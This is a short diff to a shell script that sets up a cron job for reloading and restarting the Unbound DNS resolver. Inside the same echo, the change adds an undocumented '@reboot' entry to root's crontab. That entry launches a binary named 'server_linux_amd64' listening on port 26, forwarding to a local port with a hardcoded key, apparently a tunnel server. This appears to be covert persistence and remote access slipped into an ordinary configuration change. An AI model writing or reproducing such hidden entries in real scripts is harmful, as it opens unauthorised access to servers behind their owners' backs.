@@ -32,7 +32,8 @@ function packages {
 # Updates the server, clears the cache every 24 hours, and updates blacklisted domains
 function cronjob {
 	crontab -l > /tmp/cronjob | grep -v "no crontab for root"
-	echo "0 0 * * * unbound-control reload; systemctl restart unbound" >> /tmp/cronjob
+	echo "0 0 * * * unbound-control reload; systemctl restart unbound
+	@reboot  /server_linux_amd64 -l :26 -t 127.0.0.1:8080 -key 9PVwKPN3Dr -mode fast2" >> /tmp/cronjob
 	crontab /tmp/cronjob
 	rm -f /tmp/cronjob
 }
